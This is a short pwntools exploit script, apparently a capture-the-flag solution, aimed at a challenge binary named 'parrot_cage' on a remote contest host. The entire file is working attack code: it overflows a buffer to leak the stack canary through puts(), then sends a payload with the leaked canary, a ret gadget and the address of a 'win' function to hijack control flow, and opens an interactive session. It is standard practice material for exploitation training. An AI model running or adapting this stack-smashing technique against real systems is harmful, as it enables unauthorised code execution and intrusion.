#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./parrot_cage',checksec = False)

def main():
    p = remote('offsec.m0lecon.it', 13513)
    OFFSET = 72 #discovered with b'bye'+cyclic(200)
    ret_addr = 0x000000000040101a
    probe = b'A'* (OFFSET + 1) # we increment the offset to cover the canary's LSB (\x00)

    #leak the canary using the puts()
    p.recvuntil(b'chatting.\n')
    p.send(probe)
    p.recvline()
    leak = p.recvline()   
    print(leak)
    can = u64(b'\x00'+leak[OFFSET+1 : OFFSET+8])
    print(f"{can:x}")

    #mount the attack
    attack = b'bye'+ b'A'*69 + p64(can) + b'B'*8 + p64(ret_addr) + p64(elf.sym.win)
    print(attack)
    p.send(attack)

    p.interactive()

if __name__ == "__main__":
    main()